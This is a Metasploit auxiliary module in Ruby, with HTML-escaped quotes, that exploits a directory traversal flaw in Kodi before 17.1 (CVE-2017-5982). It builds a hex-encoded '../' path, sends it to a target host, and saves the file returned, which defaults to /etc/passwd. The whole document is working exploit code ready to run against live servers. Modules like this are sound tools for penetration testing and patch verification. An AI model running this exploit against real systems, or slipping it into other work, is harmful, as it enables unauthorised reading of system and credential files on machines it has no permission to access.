# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Kodi 17.0 Local File Inclusion Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a directory traversal flaw found in Kodi before 17.1.
      },
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2017-5982&#039;],
        ],
      &#039;Author&#039;         =>
        [
          &#039;Eric Flokstra&#039;,  #Original
          &#039;jvoisin&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;DisclosureDate&#039; => "Feb 12 2017"
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path to the web application&#039;, &#039;/&#039;]),
        OptString.new(&#039;FILE&#039;,      [true, &#039;The file to obtain&#039;, &#039;/etc/passwd&#039;]),
        OptInt.new(&#039;DEPTH&#039;,        [true, &#039;The max traversal depth to root directory&#039;, 10])
      ], self.class)
  end


  def run_host(ip)
    base = normalize_uri(target_uri.path)

    peer = "#{ip}:#{rport}"

    print_status("Reading &#039;#{datastore[&#039;FILE&#039;]}&#039;")

    traverse = &#039;../&#039; * datastore[&#039;DEPTH&#039;]
    f = datastore[&#039;FILE&#039;]
    f = f[1, f.length] if f =~ /^\//
    f = "image/image://" + Rex::Text.uri_encode(traverse + f, "hex-all")

    uri = normalize_uri(base, Rex::Text.uri_encode(f, "hex-all"))
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    })

    if res and res.code != 200
      print_error("Unable to read &#039;#{datastore[&#039;FILE&#039;]}&#039;, possibily because:")
      print_error("\t1. File does not exist.")
      print_error("\t2. No permission.")

    elsif res and res.code == 200
      data = res.body.lstrip
      fname = datastore[&#039;FILE&#039;]
      p = store_loot(
        &#039;kodi&#039;,
        &#039;application/octet-stream&#039;,
        ip,
        data,
        fname
      )

      vprint_line(data)
      print_good("#{fname} stored as &#039;#{p}&#039;")

    else
      print_error(&#039;Fail to obtain file for some unknown reason&#039;)
    end
  end

end

